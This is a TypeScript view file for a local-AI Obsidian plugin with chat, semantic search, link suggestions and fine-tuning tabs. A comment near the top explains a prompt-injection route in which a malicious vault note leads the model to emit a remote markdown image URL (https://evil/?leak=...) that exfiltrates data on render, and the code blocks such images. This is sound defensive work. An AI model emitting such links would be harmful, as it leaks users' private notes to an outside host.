import { ItemView, WorkspaceLeaf, MarkdownRenderer, Notice, debounce, setIcon } from "obsidian";
import type QvacPlugin from "./main";
import { CreateNoteModal } from "./create-note-modal";
import type { Hit, Adapter, ChatMessage, Candidate, Health, ChatFrame, ProvisionFrame, ScanFrame, TrainFrame } from "./lib/rpc";

export const VIEW_TYPE_QVAC = "qvac-view";
export type QvacTab = "chat" | "search" | "connect" | "train";

function errMsg(e: unknown): string {
  if (e instanceof Error) return e.message;
  if (typeof e === "string") return e;
  try { return JSON.stringify(e); } catch { return "unknown error"; }
}

// One unified, QVAC-branded panel with four tabs. Surfaces every feature in one place:
// Chat, AI Search (semantic), Connect (related notes + create the missing [[links]]), Train.
export class QvacView extends ItemView {
  private tab: QvacTab = "chat";
  private tabsEl: HTMLElement;
  private bodyEl: HTMLElement;
  private statusDot: HTMLElement;
  private statusText: HTMLElement;
  private connected = false;
  private statusChecked = false; // has the first health check resolved yet

  // chat
  private history: ChatMessage[] = [];
  private chatBusy = false;
  private chatAbort = false; // Stop button: ignore further tokens for the current turn

  constructor(leaf: WorkspaceLeaf, private plugin: QvacPlugin) { super(leaf); }

  // Neutralize REMOTE images/HTML in LLM-authored markdown before rendering. Obsidian auto-loads
  // remote images, so a malicious note in the grounding could make the model emit
  // `![](https://evil/?leak=...)` which fires an outbound request on render - breaking the
  // "nothing leaves your machine" guarantee. Local/vault images (relative, ![[...]], app://) are kept.
  private sanitizeLlmMarkdown(md: string): string {
    return String(md || "")
      .replace(/!\[([^\]]*)\]\(\s*(https?:)?\/\/[^)]*\)/gi, "`[remote image blocked]`") // markdown remote image
      .replace(/<img\b[^>]*>/gi, "`[remote image blocked]`");                            // raw <img> (renderer allows some HTML)
  }
  // Render markdown into an element (empty + render), throttled so streaming doesn't re-render per token.
  private async renderMd(el: HTMLElement, md: string) {
    el.empty();
    await MarkdownRenderer.render(this.app, this.sanitizeLlmMarkdown(md) || "…", el, "", this);
  }
  getViewType() { return VIEW_TYPE_QVAC; }
  getDisplayText() { return "QVAC"; }
  getIcon() { return "bot"; }

  onOpen(): Promise<void> {
    const root = this.contentEl;
    root.empty();
    root.addClass("qvac");

    // header: wordmark + connection status
    const header = root.createDiv({ cls: "qvac-head" });
    const brand = header.createDiv({ cls: "qvac-brand" });
    brand.createSpan({ cls: "qvac-logo", text: "QVAC" });
    brand.createSpan({ cls: "qvac-tagline", text: "local AI" });
    const status = header.createDiv({ cls: "qvac-conn" });
    this.statusDot = status.createSpan({ cls: "qvac-dot" });
    this.statusText = status.createSpan({ cls: "qvac-conn-text", text: "…" });
    const gear = status.createSpan({ cls: "qvac-gear" });
    setIcon(gear, "settings");
    gear.setAttr("aria-label", "QVAC settings");
    gear.onclick = () => this.openSettings();

    this.tabsEl = root.createDiv({ cls: "qvac-tabs" });
    this.bodyEl = root.createDiv({ cls: "qvac-body" });
    this.buildTabBar();
    void this.refreshStatus(); // sets connected, then renders the body

    // refresh Connect's per-note section on note switch (debounced; file-open fires twice)
    this.registerEvent(this.app.workspace.on("file-open", debounce(() => { if (this.tab === "connect" && this.connected) void this.renderConnect(); }, 400, true)));
    return Promise.resolve();
  }
  onClose(): Promise<void> { return Promise.resolve(); }

  // The tabs the user has enabled, in fixed order.
  private enabledTabs(): { id: QvacTab; label: string; icon: string }[] {
    const s = this.plugin.settings;
    const all: { id: QvacTab; label: string; icon: string; on: boolean }[] = [
      { id: "chat", label: "Chat", icon: "message-square", on: s.tabChat },
      { id: "search", label: "AI Search", icon: "search", on: s.tabSearch },
      { id: "connect", label: "Connect", icon: "git-fork", on: s.tabConnect },
      { id: "train", label: "Train", icon: "graduation-cap", on: s.tabTrain },
    ];
    return all.filter((t) => t.on).map(({ id, label, icon }) => ({ id, label, icon }));
  }

  private buildTabBar() {
    this.tabsEl.empty();
    const tabs = this.enabledTabs();
    if (tabs.length && !tabs.some((t) => t.id === this.tab)) this.tab = tabs[0].id;
    for (const t of tabs) {
      const b = this.tabsEl.createDiv({ cls: "qvac-tab" });
      const ic = b.createSpan({ cls: "qvac-tab-ic" }); setIcon(ic, t.icon);
      b.createSpan({ text: t.label });
      b.dataset.tab = t.id;
      b.toggleClass("active", t.id === this.tab);
      b.onclick = () => this.setTab(t.id);
    }
    this.renderBody();
  }

  // Called by the settings tab when tab-visibility toggles change.
  rebuild() { this.buildTabBar(); }

  // Open this plugin's settings tab (the gear in the header). app.setting is not in the public
  // typings, so reach it through a narrow cast rather than `any`.
  private openSettings() {
    const setting = (this.app as unknown as { setting?: { open(): void; openTabById(id: string): void } }).setting;
    setting?.open();
    setting?.openTabById(this.plugin.manifest.id);
  }

  async refreshStatus() {
    let h: Health | null = null;
    try { h = await this.plugin.checkHealth(); } catch { h = null; }
    const on = !!h;
    const changed = on !== this.connected;
    const firstCheck = !this.statusChecked;
    this.connected = on;
    this.statusChecked = true;
    this.statusDot?.toggleClass("on", on);
    this.statusDot?.toggleClass("off", !on);
    if (this.statusText) this.statusText.setText(h ? `connected · ${h.version}` : "companion offline");
    if (changed || firstCheck) this.renderBody(); // "checking" -> offline card <-> real tab
  }

  setTab(tab: QvacTab) {
    this.tab = tab;
    for (const el of Array.from(this.tabsEl.children)) {
      if (el.instanceOf(HTMLElement)) el.toggleClass("active", el.dataset.tab === tab);
    }
    this.renderBody();
  }

  private renderBody() {
    this.bodyEl.empty();
    if (!this.enabledTabs().length) { this.bodyEl.createDiv({ cls: "qvac-empty", text: "Enable at least one tab in the QVAC settings." }); return; }
    // Neutral state until the first health check resolves, so a healthy setup never flashes the
    // "offline" card on open.
    if (!this.statusChecked) { this.bodyEl.createDiv({ cls: "qvac-empty", text: "Connecting to companion…" }); return; }
    // Nothing works without the companion; guide the user instead of failing on the first click.
    if (!this.connected) { this.renderOffline(); return; }
    // Until the models are downloaded, every tab shows the one-time Setup panel (no silent multi-GB
    // download inside a chat/index timeout).
    if (!this.plugin.isProvisioned()) { this.renderSetup(); return; }
    if (this.tab === "chat") this.renderChat();
    else if (this.tab === "search") this.renderSearch();
    else if (this.tab === "connect") void this.renderConnect();
    else if (this.tab === "train") void this.renderTrain();
  }

  private renderOffline() {
    const wrap = this.bodyEl.createDiv({ cls: "qvac-setup" });
    wrap.createDiv({ cls: "qvac-train-title", text: "Companion offline" });
    wrap.createDiv({ cls: "qvac-train-desc", text: "The AI runs in a local companion process that this plugin talks to over 127.0.0.1. It is not running yet. Start it, then recheck." });
    const steps = wrap.createEl("ol", { cls: "qvac-offline-steps" });
    steps.createEl("li").setText("Open a terminal.");
    const li = steps.createEl("li");
    li.setText("Run: ");
    li.createEl("code", { text: "npx qvac-obsidian-companion" });
    steps.createEl("li").setText("Leave it running, then click Recheck below.");
    wrap.createEl("button", { cls: "qvac-btn-primary", text: "Recheck" }).onclick = () => { void this.refreshStatus(); };
  }

  // ---------- SETUP (first-run provisioning) ----------
  private renderSetup() {
    const wrap = this.bodyEl.createDiv({ cls: "qvac-setup" });
    wrap.createDiv({ cls: "qvac-train-title", text: "Set up QVAC" });
    const custom = !!this.plugin.settings.customModelSrc;
    wrap.createDiv({ cls: "qvac-train-desc", text: custom
      ? "Using your custom chat model, so only the small embeddings model (~300 MB) downloads into ~/.qvac. This runs once and happens entirely on your machine - nothing leaves it."
      : "Downloads the local AI models (~4.5 GB: a chat model + an embeddings model) into ~/.qvac. This runs once and happens entirely on your machine - nothing leaves it. Search and Connect work as soon as the small embeddings model lands." });
    const btn = wrap.createEl("button", { cls: "qvac-btn-primary", text: custom ? "Download embeddings (~300 MB) & finish" : "Download & set up" });
    const status = wrap.createDiv({ cls: "qvac-train-status" });
    const barWrap = wrap.createDiv({ cls: "qvac-bar hidden" });
    const bar = barWrap.createDiv({ cls: "qvac-bar-fill" });
    btn.onclick = async () => {
      btn.disabled = true; barWrap.removeClass("hidden"); status.setText("Starting download…");
      try {
        const res = await this.plugin.provision((f: ProvisionFrame) => {
          if (f.type === "provision.progress") {
            const p = f.percentage;
            status.setText(`Downloading ${f.model === "embed" ? "embeddings" : "chat"} model${p != null ? ` · ${Math.round(p)}%` : "…"}`);
            if (p != null) bar.setCssStyles({ width: Math.max(2, Math.round(p)) + "%" });
          }
        });
        if (res.ok) {
          await this.plugin.markProvisioned();
          status.setText("Done. Indexing your vault…");
          void this.plugin.indexVault(false);
          new Notice("QVAC is ready.");
          this.setTab(this.tab); // re-render the real tab now that we're provisioned
        } else status.setText("Setup failed: " + (res.error ?? "unknown"));
      } catch (e) { status.setText("Setup failed: " + errMsg(e)); }
      finally { btn.disabled = false; }
    };
  }

  // ---------- CHAT ----------
  private renderChat() {
    const wrap = this.bodyEl.createDiv({ cls: "qvac-chat" });
    const toolbar = wrap.createDiv({ cls: "qvac-chat-toolbar" });
    const voiceBtn = toolbar.createEl("button", { cls: "qvac-pill" });
    const setVoiceLabel = () => { const on = this.plugin.settings.voiceEnabled && !!this.plugin.settings.voiceAdapter; voiceBtn.toggleClass("on", on); voiceBtn.setText(on ? "✓ Vault model" : "Vault model"); };
    setVoiceLabel();
    voiceBtn.onclick = async () => {
      if (!this.plugin.settings.voiceAdapter) { new Notice("QVAC: train a vault model first (Train tab)"); this.setTab("train"); return; }
      this.plugin.settings.voiceEnabled = !this.plugin.settings.voiceEnabled;
      await this.plugin.saveSettings(); setVoiceLabel();
    };
    const clearBtn = toolbar.createEl("button", { cls: "qvac-pill", text: "Clear" });
    clearBtn.onclick = () => { this.history = []; messages.empty(); };

    const messages = wrap.createDiv({ cls: "qvac-messages" });
    for (const m of this.history) this.renderMsg(messages, m.role === "user" ? "user" : "assistant", m.content, []);

    const inputRow = wrap.createDiv({ cls: "qvac-input" });
    const ta = inputRow.createEl("textarea", { attr: { rows: "1", placeholder: "Ask your vault…" } });
    ta.addEventListener("input", () => { ta.setCssStyles({ height: "auto" }); ta.setCssStyles({ height: Math.min(ta.scrollHeight, 140) + "px" }); });
    ta.addEventListener("keydown", (e) => { if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); if (this.chatBusy) stop(); else void send(); } });
    const sendBtn = inputRow.createEl("button", { cls: "qvac-send" }); setIcon(sendBtn, "arrow-up");
    const setBtn = (busy: boolean) => { sendBtn.empty(); setIcon(sendBtn, busy ? "square" : "arrow-up"); sendBtn.toggleClass("stop", busy); sendBtn.setAttr("aria-label", busy ? "Stop" : "Send"); };
    const stop = () => { if (this.chatBusy) this.chatAbort = true; };
    const send = async () => {
      const q = ta.value.trim(); if (!q || this.chatBusy) return;
      ta.value = ""; ta.setCssStyles({ height: "auto" }); this.chatBusy = true; this.chatAbort = false; setBtn(true);
      this.renderMsg(messages, "user", q, []);
      const body = this.renderMsg(messages, "assistant", "", []);
      const bodyText = body.querySelector<HTMLElement>(".qvac-msg-body");
      if (!bodyText) { this.chatBusy = false; setBtn(false); return; }
      bodyText.addClass("qvac-typing"); bodyText.setText("…");
      let acc = "", hits: Hit[] = [], lastRender = 0;
      const paint = (final = false) => {
        const now = Date.now();
        if (!final && now - lastRender < 150) return; // throttle markdown re-render during streaming
        lastRender = now; bodyText.removeClass("qvac-typing");
        void this.renderMd(bodyText, acc); messages.scrollTop = messages.scrollHeight;
      };
      try {
        const res = await this.plugin.chat(q, this.history, (f: ChatFrame) => {
          if (this.chatAbort) return;
          if (f.type === "chat.start") hits = f.hits ?? [];
          else if (f.type === "chat.token") { acc += f.text ?? ""; paint(); }
          else if (f.type === "chat.error") { acc += (acc ? "\n\n" : "") + "_Error: " + (f.error ?? "unknown") + "_"; paint(true); }
        });
        if (this.chatAbort) {
          acc += (acc ? "\n\n" : "") + "_(stopped)_";
          await this.renderMd(bodyText, acc);
          this.history.push({ role: "user", content: q }); this.history.push({ role: "assistant", content: acc });
        } else if (res.ok) {
          acc = res.data?.contentText ?? acc; hits = res.data?.hits ?? hits;
          await this.renderMd(bodyText, acc || "(no answer)");
          this.renderCites(body, hits);
          this.addCreateNote(body, acc);
          this.history.push({ role: "user", content: q }); this.history.push({ role: "assistant", content: acc });
          if (res.data?.model?.includes("voice")) body.createDiv({ cls: "qvac-msg-model", text: "answered from your vault model" });
        } else { bodyText.removeClass("qvac-typing"); bodyText.setText("Error: " + (res.error ?? "unknown")); }
      } catch (e) { bodyText.removeClass("qvac-typing"); bodyText.setText("Error: " + errMsg(e)); }
      finally { this.chatBusy = false; this.chatAbort = false; setBtn(false); messages.scrollTop = messages.scrollHeight; }
    };
    sendBtn.onclick = () => { if (this.chatBusy) stop(); else void send(); };
    window.setTimeout(() => ta.focus(), 0);
  }
  // Offer to save an assistant answer as a new vault note (path confirmed in a modal).
  private addCreateNote(msgEl: HTMLElement, content: string) {
    if (!content.trim()) return;
    const row = msgEl.createDiv({ cls: "qvac-msg-actions" });
    const btn = row.createEl("button", { cls: "qvac-pill", text: "Create note" });
    btn.onclick = () => {
      const m = /^#\s+(.+)$/m.exec(content);
      const title = (m ? m[1] : "Untitled").trim().replace(/[\\/:*?"<>|]/g, "-").slice(0, 80) || "Untitled";
      new CreateNoteModal(this.app, `${title}.md`, (path) => { void this.plugin.createNote(path, content); }).open();
    };
  }
  private renderMsg(container: HTMLElement, role: "user" | "assistant", text: string, hits: Hit[]): HTMLElement {
    const el = container.createDiv({ cls: `qvac-msg qvac-msg-${role}` });
    el.createDiv({ cls: "qvac-msg-role", text: role === "user" ? "You" : "QVAC" });
    const b = el.createDiv({ cls: "qvac-msg-body" });
    if (text) b.setText(text);
    if (hits.length) this.renderCites(el, hits);
    container.scrollTop = container.scrollHeight;
    return el;
  }
  private renderCites(msgEl: HTMLElement, hits: Hit[]) {
    if (!hits.length) return;
    const wrap = msgEl.createDiv({ cls: "qvac-cites" });
    const seen = new Set<string>(); let n = 0;
    for (const h of hits) {
      if (seen.has(h.source)) continue; seen.add(h.source); n++;
      const chip = wrap.createEl("a", { cls: "qvac-cite", href: "#" });
      const ic = chip.createSpan({ cls: "qvac-cite-ic" }); setIcon(ic, h.sourceType === "image" ? "image" : "file-text");
      chip.createSpan({ text: `${n}. ${h.source.replace(/\.md$/, "")}` });
      chip.onclick = (e) => { e.preventDefault(); void this.plugin.openSource(h.source); };
    }
  }

  // ---------- SEARCH ----------
  private renderSearch() {
    const wrap = this.bodyEl.createDiv({ cls: "qvac-search" });
    const row = wrap.createDiv({ cls: "qvac-search-row" });
    const inp = row.createEl("input", { attr: { type: "text", placeholder: "Search your vault by meaning…" } });
    const results = wrap.createDiv({ cls: "qvac-search-results" });
    const run = async () => {
      const q = inp.value.trim(); if (!q) { results.empty(); return; }
      results.empty(); results.setText("Searching…");
      try {
        const hits = await this.plugin.search(q);
        results.empty();
        if (!hits.length) { results.createDiv({ cls: "qvac-empty", text: "No matches." }); return; }
        for (const h of hits) {
          const card = results.createDiv({ cls: "qvac-result" });
          const top = card.createDiv({ cls: "qvac-result-top" });
          const a = top.createEl("a", { cls: "qvac-result-title", text: h.source.replace(/\.md$/, ""), href: "#" });
          a.onclick = (e) => { e.preventDefault(); void this.plugin.openSource(h.source); };
          top.createSpan({ cls: "qvac-result-score", text: Math.round((h.score ?? 0) * 100) + "%" });
          card.createDiv({ cls: "qvac-result-snippet", text: (h.content ?? "").slice(0, 180) });
        }
      } catch (e) { results.empty(); results.setText("Search unavailable: " + errMsg(e)); }
    };
    inp.addEventListener("keydown", (e) => { if (e.key === "Enter") void run(); });
    window.setTimeout(() => inp.focus(), 0);
  }

  // ---------- CONNECT (related notes + create the missing [[links]]) ----------
  private async renderConnect() {
    this.bodyEl.empty(); // the file-open handler calls this directly; without empty it stacks a new panel per note switch
    const wrap = this.bodyEl.createDiv({ cls: "qvac-connect" });
    wrap.createDiv({ cls: "qvac-connect-intro", text: "Obsidian only knows the [[links]] you type. Connect finds notes that belong together but are not linked yet, and writes the link for you." });

    // vault-wide scan
    const scanBtn = wrap.createEl("button", { cls: "qvac-btn-primary", text: "Scan vault for missing links" });
    const scanStatus = wrap.createDiv({ cls: "qvac-connect-status" });
    const scanResults = wrap.createDiv({ cls: "qvac-connect-results" });
    scanBtn.onclick = async () => {
      scanBtn.disabled = true; scanStatus.setText("Scanning…"); scanResults.empty();
      try {
        const res = await this.plugin.connectScan(this.plugin.existingLinkPairs(), (f: ScanFrame) => {
          if (f.type === "connect.progress") scanStatus.setText(`Judging ${f.done}/${f.total} candidates…`);
        });
        const cands = (res.ok && res.data?.candidates) || [];
        scanStatus.setText(cands.length ? `${cands.length} link(s) proposed` : `No missing links found (${res.data?.notes ?? 0} notes).`);
        if (cands.length) {
          const linkAll = scanResults.createEl("button", { cls: "qvac-pill on qvac-linkall", text: `Link all (${cands.length})` });
          const list = scanResults.createDiv({ cls: "qvac-connect-list" });
          for (const c of cands) this.renderProposal(list, c);
          linkAll.onclick = async () => {
            linkAll.disabled = true; linkAll.setText("Linking…");
            let done = 0;
            for (const c of cands) { if (await this.plugin.insertLink(c.a, c.b)) done++; }
            list.empty(); linkAll.remove();
            scanStatus.setText(`Linked ${done} of ${cands.length}.`);
          };
        }
      } catch (e) { scanStatus.setText("Scan failed: " + errMsg(e)); }
      finally { scanBtn.disabled = false; }
    };

    // per-note: related to the active note, each one-click linkable
    const file = this.app.workspace.getActiveFile();
    if (file && file.extension === "md") {
      wrap.createDiv({ cls: "qvac-connect-subhead", text: "Related to " + file.basename });
      const list = wrap.createDiv({ cls: "qvac-connect-related" });
      list.setText("Finding related…");
      try {
        const text = await this.app.vault.cachedRead(file);
        const hits = await this.plugin.related(text, file.path);
        const linked = new Set(this.plugin.linkedTargetsOf(file.path));
        list.empty();
        if (!hits.length) { list.createDiv({ cls: "qvac-empty", text: "No related notes." }); return; }
        for (const h of hits) this.renderRelatedRow(list, file.path, h, linked.has(h.source));
      } catch (e) { list.empty(); list.setText("Unavailable: " + errMsg(e)); }
    } else {
      wrap.createDiv({ cls: "qvac-empty", text: "Open a note to see + link related notes." });
    }
  }
  // a vault-scan proposal: A <-> B + reason; "Link" inserts [[B]] into A.
  private renderProposal(container: HTMLElement, c: Candidate) {
    const card = container.createDiv({ cls: "qvac-proposal" });
    const top = card.createDiv({ cls: "qvac-proposal-top" });
    const a = top.createEl("a", { cls: "qvac-result-title", text: c.a.replace(/\.md$/, ""), href: "#" });
    a.onclick = (e) => { e.preventDefault(); void this.plugin.openSource(c.a); };
    top.createSpan({ cls: "qvac-proposal-arrow", text: "↔" });
    const b = top.createEl("a", { cls: "qvac-result-title", text: c.b.replace(/\.md$/, ""), href: "#" });
    b.onclick = (e) => { e.preventDefault(); void this.plugin.openSource(c.b); };
    card.createDiv({ cls: "qvac-proposal-reason", text: c.reason });
    const acts = card.createDiv({ cls: "qvac-proposal-acts" });
    const linkBtn = acts.createEl("button", { cls: "qvac-pill on", text: "Link" });
    linkBtn.onclick = async () => { if (await this.plugin.insertLink(c.a, c.b)) { card.addClass("qvac-done"); linkBtn.setText("✓ Linked"); linkBtn.disabled = true; } };
    acts.createEl("button", { cls: "qvac-pill", text: "Skip" }).onclick = () => card.remove();
  }
  // a related-note row for the active note: open, score, and "+ Link" (or "✓ linked").
  private renderRelatedRow(container: HTMLElement, fromPath: string, h: Hit, linked: boolean) {
    const card = container.createDiv({ cls: "qvac-result" });
    const top = card.createDiv({ cls: "qvac-result-top" });
    const a = top.createEl("a", { cls: "qvac-result-title", text: h.source.replace(/\.md$/, ""), href: "#" });
    a.onclick = (e) => { e.preventDefault(); void this.plugin.openSource(h.source); };
    const right = top.createDiv({ cls: "qvac-result-right" });
    right.createSpan({ cls: "qvac-result-score", text: Math.round((h.score ?? 0) * 100) + "%" });
    if (linked) right.createSpan({ cls: "qvac-linked", text: "✓ linked" });
    else {
      const lb = right.createEl("button", { cls: "qvac-pill", text: "+ Link" });
      lb.onclick = async () => { if (await this.plugin.insertLink(fromPath, h.source)) { lb.setText("✓ linked"); lb.disabled = true; } };
    }
  }

  // ---------- TRAIN ----------
  private async renderTrain() {
    const wrap = this.bodyEl.createDiv({ cls: "qvac-train" });
    wrap.createDiv({ cls: "qvac-train-title", text: "Train a model on your vault" });
    wrap.createDiv({ cls: "qvac-train-desc", text: "Fine-tunes a small local model on your notes. It learns your knowledge AND your writing style, so chat can answer from memory (lighter on context) and reply in your voice. Runs on your machine; chat is paused for a few minutes during a run." });
    const startBtn = wrap.createEl("button", { cls: "qvac-btn-primary", text: "Train now" });
    const statusEl = wrap.createDiv({ cls: "qvac-train-status" });
    const barWrap = wrap.createDiv({ cls: "qvac-bar hidden" });
    const bar = barWrap.createDiv({ cls: "qvac-bar-fill" });
    const sub = wrap.createDiv({ cls: "qvac-train-sub" });

    wrap.createDiv({ cls: "qvac-train-subhead", text: "Your vault models" });
    const adaptersEl = wrap.createDiv({ cls: "qvac-adapters" });
    const refreshAdapters = async () => {
      adaptersEl.empty();
      let adapters: Adapter[] = [];
      try { adapters = await this.plugin.trainList(); } catch { /* */ }
      if (!adapters.length) { adaptersEl.createDiv({ cls: "qvac-empty", text: "No vault models yet." }); return; }
      for (const a of adapters) {
        const active = this.plugin.settings.voiceAdapter === a.file;
        const card = adaptersEl.createDiv({ cls: "qvac-adapter" + (active ? " active" : "") });
        card.createDiv({ cls: "qvac-adapter-name", text: `${a.baseKey} · ${a.sizeMB} MB${active ? " · active" : ""}` });
        const acts = card.createDiv({ cls: "qvac-adapter-acts" });
        const useBtn = acts.createEl("button", { text: active ? "Active" : "Use" }); useBtn.disabled = active;
        useBtn.onclick = async () => { await this.plugin.setVoiceAdapter(a.file); void refreshAdapters(); new Notice("QVAC: vault model enabled in chat."); };
        acts.createEl("button", { text: "Delete" }).onclick = async () => { await this.plugin.trainDelete(a.file); if (active) await this.plugin.setVoiceAdapter(null); void refreshAdapters(); };
      }
    };
    void refreshAdapters();

    startBtn.onclick = async () => {
      startBtn.disabled = true; statusEl.setText("Building dataset from your notes…"); barWrap.removeClass("hidden");
      try {
        const res = await this.plugin.trainStart({ epochs: 1 }, (f: TrainFrame) => {
          if (f.type === "train.dataset") statusEl.setText(`Training on ${f.proseNotes} notes · chat is paused`);
          else if (f.type === "train.progress") {
            const pct = f.totalBatches ? Math.round(((f.step ?? 0) / f.totalBatches) * 100) : 0;
            bar.setCssStyles({ width: pct + "%" });
            sub.setText(`epoch ${f.epoch} · step ${f.step}/${f.totalBatches} · loss ${f.loss ?? "…"} · eta ${f.etaSec}s`);
          }
        });
        if (res.ok && res.data?.status === "COMPLETED") { statusEl.setText(`Done. Trained a vault model (${res.data.adapterMB} MB) in ${res.data.elapsedSec}s.`); new Notice("QVAC: vault model trained. Enable it in Chat."); }
        else statusEl.setText("Training did not complete: " + (res.error ?? res.data?.status ?? "unknown"));
      } catch (e) { statusEl.setText("Training failed: " + errMsg(e)); }
      finally { startBtn.disabled = false; barWrap.addClass("hidden"); bar.setCssStyles({ width: "0%" }); sub.setText(""); void refreshAdapters(); }
    };
  }
}
